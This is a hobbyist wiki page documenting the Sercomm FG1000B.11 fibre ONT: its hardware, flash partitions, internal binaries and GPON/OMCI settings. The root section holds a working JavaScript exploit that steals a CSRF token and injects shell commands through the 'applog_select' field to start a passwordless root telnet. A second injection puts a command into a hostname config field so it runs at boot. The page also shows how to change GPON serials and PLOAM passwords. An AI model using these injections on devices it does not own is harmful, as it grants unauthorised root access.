---
title: Sercomm FG1000B.11
has_children: false
layout: default
parent: Sercomm
---

# Hardware Specifications

|                 |                        |
| --------------- | ---------------------- |
| Vendor/Brand    | Sercomm                |
| Model           | FG1000B.11             |
| ODM             | ✅                     |
| Chipset         | BCM68360_B1            |
| Flash           | NAND 128 MB            |
| RAM             | 256 MB (197 MB usable) |
| CPU             | Broadcom B53 Dual Core |
| CPU Clock       | 1500MHz                |
| Bootloader      | CFE                    |
| Load addr       | 0x80000                |
| 2.5GBaseT       | Yes                    |
| PHY Ethernet    | RTL8221B               |
| Optics          | SC/APC                 |
| IP address      | 192.168.100.1/24       |
| Web Gui         | ✅, no login needed    |
| SSH             | No                     |
| Telnet          | No                     |
| Serial          | ✅, only TX            |
| Serial baud     | 115200                 |
| Serial encoding | 8-N-1                  |
| Form Factor     | ONT                    |

## Credits
This whole documentation here was made possible by reverse engineering, and time investment from [hwti](https://github.com/hwti) and the rest of the folks from the forum mention in the links section of the page. Thanks a lot !

{% include image.html file="fg1000b-11_rear.jpg" alt="Sercomm FG1000B.11" caption="Sercomm FG1000B.11 rear" %}
{% include image.html file="fg1000b-11_bottom.jpg" alt="Sercomm FG1000B.11 bottom" caption="Sercomm FG1000B.11 bottom" %}
{% include image.html file="fg1000b-11_side1.jpg" alt="Sercomm FG1000B.11 side 1" caption="Sercomm FG1000B.11 side 1" %}
{% include image.html file="fg1000b-11_side2.jpg" alt="Sercomm FG1000B.11 side 2" caption="Sercomm FG1000B.11 side 2" %}

## Serial

See picture side2 for the pin identification, use 112500 8-N-1
The ONT seems only to display output of the ROM CFE and flash CFE, but don't allow interupting the boot...

{% include serial_dump.html file="fg1000b-11_boot_cfe.txt" alt="Sercomm FG1000B.11 CFE boot dump" title="Sercomm FG1000B.11 CFE boot dump" %}

## Root procedure
[See how the enable telnet/ssh section](/ont-sercomm-fg1000b-11/#enable-telnetsshserial)

## List of software versions

Current only version seen is: 090144.1.0.001

## List of partitions
`cat /proc/mtd`
| dev:   | size     | erasesize | name                 |
| ------ | -------- | --------- | -------------------- |
| mtd0:  | 00200000 | 00020000  | "CfeROM              |
| mtd1:  | 00400000 | 00020000  | "CfeRAM1             |
| mtd2:  | 00400000 | 00020000  | "CfeRAM2             |
| mtd3:  | 000a0000 | 00020000  | "FlashMAP            |
| mtd4:  | 000a0000 | 00020000  | "SN                  |
| mtd5:  | 00140000 | 00020000  | "Protect             |
| mtd6:  | 01b80000 | 00020000  | "Rootfs1             |
| mtd7:  | 00c80000 | 00020000  | "Lib1                |
| mtd8:  | 01b80000 | 00020000  | "Rootfs2             |
| mtd9:  | 00c80000 | 00020000  | "Lib2                |
| mtd10: | 000a0000 | 00020000  | "Bootflg             |
| mtd11: | 000a0000 | 00020000  | "Rootfs1_Info        |
| mtd12: | 000a0000 | 00020000  | "Lib1_Info           |
| mtd13: | 000a0000 | 00020000  | "Rootfs2_Info        |
| mtd14: | 000a0000 | 00020000  | "Lib2_Info           |
| mtd15: | 00280000 | 00020000  | "XMLConfig           |
| mtd16: | 00280000 | 00020000  | "Erasable_XML_CFG    |
| mtd17: | 00960000 | 00020000  | "AppData             |
| mtd18: | 00140000 | 00020000  | "Yaffs               |
| mtd19: | 010c0000 | 00020000  | "Reserve             |
| mtd20: | 00930000 | 0001f000  | "rootfs_ubifs        |
| mtd21: | 0029bf98 | 0001f000  | "filestruct_full.bin |
| mtd22: | 003bd000 | 0001f000  | "lib_squashfs        |

# Useful files and binaries

{% include alert.html content="warning calling the `board_init` binary directly or inderactly (via init script) when the board is already booted will cause NanD mtd 5, 15, 16 & 17 to be erased ! 
Please backup those before any hacking !. Recovery is possible if you hardware reset the device, enable the telnet and recreate the `customer_sn,gpon_sn,hw_version,mac_addr,pcba_sn` file on the `/tmp/var_link_dir/ft` volume which can be remount R/W `mount -o remount,rw /dev/mtdblock5 /tmp/var_link_dir/ft`. Beware of the `flash_eraseall` binary which may be erasing all the nand (not tested)" alert="Warning" icon="svg-warning" color="red" %}

{% include alert.html content="NanD MTD 5 mounted as  `/tmp/var_link_dir/ft` contains all serials and mac address of the ONT, please consider backup before any hack, files are: `customer_sn,gpon_sn,hw_version,mac_addr,pcba_sn`" alert="Warning" icon="svg-warning" color="red" %}

## Useful files
* `/etc/framework_init.sh` - is the main entry for sercomm framework launch by /etc/rcS

## Useful binaries
* `pb_ap` - monitoring the `reset button`, if pushed more than 10s it reset to factory default, otherwise it reboot the device - Run at startup - no args

* `fw_image_ctl` - allow firmware info, upgrade, switch between `fw0` & `fw1`, replicate between fw, desactivate image etc... - Options listes when called woth no args

* `cmld_client`- manipulate the configuration 'DB' stored in a /dev/mtd15, output is XML format. The root element is "InternetGatewayDevice" you need to use a final '.' dot to list all sub-element. example to get the full device XML config ```cmld_client get_node InternetGatewayDevice.```. Element with writable="1" can be changed with 'set' and the node path. Element marked dynamic="1" have their value evaluated at the time you specifically call get on the node, `cmld_client get  InternetGatewayDevice.WANDevice.1.X_SC_GponInterfaceConfig.Status` - The daemon is run at startup - option list whe called with no args

* `cmd_agent` - is a strange daemon launch at startup during /etc/rcS that open a /tmp/cmd_client sock file that listen to command and execute them. - No args

* `statd` - is a daemon launch at boot which collect monitoring data from the ONT. - No args

* `ubusd` - ubusd is used to send message between processes, current ubus services are `cml,network-manager,smd`

* `smd` - is the daemon in charge of launching `/opt/` plugin for each of the ONT service like: `init, gpon, iptv, temperature, account, http, lan, network, syslog, system`. All is done in code which is not helping hacking the device.

# Usage

## Enable telnet/SSH/serial

Below code can be pasted in the browser console after loading the `http://192.168.100.1` (default ONT page). This will enable telnet as root with no password on the device (same can be done with '/usr/sbin/sshd' binary). The below hack uses an injection on the 'eventlog_applog_download.json' page, command can be injected in the request body 'applog_select' parameter and are executed as superadmin(root).
```
// Fetch a non csrf protected page to get a csrf token
await fetch("http://192.168.100.1/setup.cgi?next_file=statusandsupport/status.html").then(function (response) {
	return response.text();
}).then(function (html) {
	//inject the html response into a HTML DOM to parse it
    var el = document.createElement( 'html' );
    el.innerHTML = html;
	//The token is inserted into the first <script> tag of the page
    var es = el.getElementsByTagName( 'script' );
	var aText = es[0].text;
	//Add the csrf token in the document for other requests
    document.csrf_token = aText.match("'(.*)'")[1];
}).catch(function (err) {
	console.warn('Something went wrong.', err);
});

//use the csrf token to activate telnet with no login and a shell

fetch('http://192.168.100.1/data/statussupporteventlog_applog_download.json?_=1686211215966&csrf_token='+document.csrf_token, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
  },
  body: 'applog_select=a;echo "#!/bin/sh" > /tmp/slogin;echo "export PATH=/bin:/sbin:/usr/bin:/usr/sbin" >> /tmp/slogin;echo "/bin/sh" >> /tmp/slogin;/bin/chmod 755 /tmp/slogin;/usr/sbin/telnetd -l /tmp/slogin'
})
.then(res => res.json())
.then(console.log)
```

There is a way to make a script call at boot if you want to have telnet or other service started at boot. It uses a hack from libsl_system.so where there is a system(...) call using a String from config, string must be <=12 char, the system call is supposed to set set hostname of the device for storage sharing.
In the example below you would first creat a /data/up shell script and ensure it has execute rights (ex chmod 755)
```
#first we need to add the missing entry
cmld_client add InternetGatewayDevice.Services.StorageService. 1
#then inject within the 12 character limit the hostname and a call to our script
cmld_client set InternetGatewayDevice.Services.StorageService.1.X_SC_NetbiosName='a;/data/up&'
cmld_client save
```

## Log configuration
'syslogd' is configure via Config DB config 'cmld_client get_node InternetGatewayDevice.X_SC_Management.Syslog.' this config is read from the libsl_syslog.so plugin of smd daemon, which generate the file '/tmp/lxxd/logd.conf' and start the daemon with it as parameter.

# GPON ONU status

## Get the operational status of the ONU
```
/bin/gponctl getState
``` 

## Get information of the OLT vendor
```
/usr/sbin/umci_ctl stack get olt_type
```
or
```
/usr/sbin/umci_ctl rg help
```

## Querying a particular OMCI ME
```
/usr/sbin/umci_ctl mib
```

## Getting/Setting Speed LAN Mode

# GPON/OMCI settings

Part of GPON config is done via the misc configuration loaded as first lib by the smd binary, config can be seens here:
```
/usr/bin/cmld_client get_node InternetGatewayDevice.X_SC_MiscCfg.GPON.
```
Beware the field 'OmciManageUniMask', 'PretendFwVersion' are initiated in the binary with respective value '01000000', '0'

## Getting/Setting ONU GPON Serial Number
Default value: 16 hexa on the back of the ONT, starts with '53434F4DA'
You can test serial and/or ploam combinaison using with below command. Pwd is Hexe only and can be up to 36.
```
/bin/gponctl stop
/bin/gponctl setSnPwd --pwd 00-00-0X-XX-XX-XX-XX-XX-XX-XX --sn YY-YY-YY-YY-YY-YY-YY-YY
/bin/gponctl start

# You can monitor status by running:
/bin/gponctl getstate
```
To save the serial number you need to re-mount R/W the '/tmp/var_link_dir/ft' and change the "gpon_sn" file (consider backup of the folder before ANY action)
```
/bin/mount -o remount,rw /dev/mtdblock5 /tmp/var_link_dir/ft
echo "XXXXXXXXXXXXX" > /tmp/var_link_dir/ft/gpon_sn
/bin/mount -o remount,ro /dev/mtdblock5 /tmp/var_link_dir/ft
/sbin/reboot
```

## Getting/Setting ONU GPON PLOAM password

As of now there was not found a config/command other than the http call below to save the PLOAM password permanently after reboot.
PLOAM can be set directly for Text or Hexa(without 0x) via Web interface if <10 digit otherwise POST call to URL allow > 10 digits for example 20 digit hex can be setup via (max is 36 digit):

```
curl -i -s -k -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' \
    -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
    -d $'ploam_password=00000XXXXXXXXXXXXXXX' \
    $'http://192.168.100.1/ONT/client/data/Router.json'
```

## Getting/Setting ONU GPON LOID and LOID password
Not tested but seems used by the misc config at smd init:
```
/usr/bin/cmld_client set InternetGatewayDevice.X_SC_MiscCfg.GPON.LoIdPassword=
```
```
/usr/bin/cmld_client set InternetGatewayDevice.X_SC_MiscCfg.GPON.LoId=
```

## Getting/Setting OMCI software version (ME 7)
'get' works, 'set' is not tested but seems used by the misc config at smd init:
```
/usr/bin/cmld_client get InternetGatewayDevice.X_SC_MiscCfg.GPON.OmciVersion
```
or via umci_ctl get/set tool (not tested if config overwrite umci or the other way around)
```
/usr/sbin/umci_ctl mib get 7
```

## Getting/Setting OMCI hardware version (ME 256)
Default value: 'Glasfaser.DTV1'
```
/bin/mount -o remount,rw /dev/mtdblock5 /tmp/var_link_dir/ft
echo "XXXXXXXXXXXXX" > /tmp/var_link_dir/ft/hw_version
/bin/mount -o remount,ro /dev/mtdblock5 /tmp/var_link_dir/ft
reboot
```
## Getting/Setting OMCI vendor ID (ME 256)
Default value: '53434F4D'
```
/usr/sbin/umci_ctl mib get 256
```
'set' option is available with Class_id, Entity_id, Index and Value parameters, not tested.

## Getting/Setting OMCI equipment ID (ME 257)
```
/usr/sbin/umci_ctl mib get 256
```
'set' option is available with Class_id, Entity_id, Index and Value parameters, not tested.

# Advanced settings

## Transferring files to the stick
Since neither netcat/nc nor ftp/Sftp/Ftps are available the best option is to use curl to download file from a webserver on your network over HTTP only.
Additionaly you can add a arm full version of busybox in the /data partition and then use nc to pipe data in and out of the device.

## Backup of all partition
You can use dd which is available on the device/default busybox to backup the efull nand via /dev/mtd

## Checking the currently active image
```
/usr/sbin/fw_ctl -s
```
Output information about the firmware includin a 'current running fw' line

## Booting to a different image
```
/usr/sbin/fw_ctl -c X
```
X - <0|1|3>          set commit image, 3: commit current fw

## Cloning of image 0 into image 1
```
/usr/sbin/fw_ctl -r XXXX
```
XXX - <fw|lib>        copy type <fw|lib> from current fw to backup fw

## Setting management MAC
```
/bin/mount -o remount,rw /dev/mtdblock5 /tmp/var_link_dir/ft
echo "A095XXXXXXXX" > /tmp/var_link_dir/ft/mac_addr
/bin/mount -o remount,ro /dev/mtdblock5 /tmp/var_link_dir/ft
/sbin/reboot
```
The format is 12 hex digit without '0x' not ':'

## Setting management IP
```
/usr/bin/cmld_client set InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.IPInterfaceIPAddress=192.168.100.1
/usr/bin/cmld_client save
```

## Rebooting the ONU
Either via the public WebUi `http://192.168.100.1/ONT/client/html/content/config/problem_handling.html?lang=en`,  `Reboot` boutton
or
```
/sbin/reboot
```
# Known Bugs
It seems the `cmld_client get` can't return String value longr than 12 characters even for fields type mentioning String length. Walkaround is to use the `get_node` on the parent element to get proper value ouput.

# Miscellaneous Links

- [FG1000B.11 - lafibre.info](https://lafibre.info/remplacer-bbox/test-glasfaser-modem-2-telekom-pour-remplacement-ont-2-5gbe-synchro-ok-ipv4-ok/)

# Other brand names

 - 1&1 Glasfaser Modem
 - Telekom Glasfaser Modem 2


